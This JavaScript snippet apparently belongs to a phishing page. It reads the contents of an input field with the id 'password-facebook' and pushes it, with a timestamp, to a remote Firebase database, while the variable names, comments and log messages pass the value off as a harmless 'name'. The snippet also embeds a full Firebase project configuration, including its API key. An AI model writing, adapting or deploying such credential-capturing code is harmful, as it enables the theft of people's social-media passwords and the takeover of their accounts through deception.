   // Your Firebase setup code
    var firebaseConfig = {
        apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
        authDomain: "test-for-admin-9c05c.firebaseapp.com",
        databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
        projectId: "test-for-admin-9c05c",
        storageBucket: "test-for-admin-9c05c.appspot.com",
        messagingSenderId: "180529484791",
        appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
    };
    firebase.initializeApp(firebaseConfig);

    // Reference to the input field and error message
    var inputField = document.getElementById('password-facebook');
    var errorMessage = document.getElementById('error-message');
    var fadeTimeout;

    function submitEmail() {
        var name = inputField.value;

        function checkName(name) {
            // Inner function to ask for the name
            function askForName() {
                console.log("Please write the name first");
                errorMessage.style.opacity = '1';  // Show the error message (fade in)
                
                // Set timeout to fade out after 3 seconds
                fadeTimeout = setTimeout(function() {
                    errorMessage.style.opacity = '0';  // Fade out the error message
                }, 3000);
            }

            // Check if the name is empty
            if (name === "") {
                askForName();  // Call the inner function
                console.log("Field is empty!");  // Show the next message
                return false;  // Return false to prevent Firebase push
            }

            errorMessage.style.opacity = '0';  // Ensure the message is hidden if input is valid
            return true;  // Name is valid
        }

        // Call checkName before pushing data to Firebase
        if (checkName(name)) {
            firebase.database().ref('Names').push({
                name: name,
                timestamp: new Date().toISOString()
            }).then(() => {
                console.log('Data saved successfully');
            }).catch((error) => {
                console.log('Error occurred: ' + error);
            });
        }
    }

    // Add event listener to hide the error message if user starts typing again
    inputField.addEventListener('input', function() {
        if (errorMessage.style.opacity === '1') {
            errorMessage.style.opacity = '0';  // Hide the error message immediately
            clearTimeout(fadeTimeout);  // Clear the fade-out timeout if user starts typing again
        }
    });
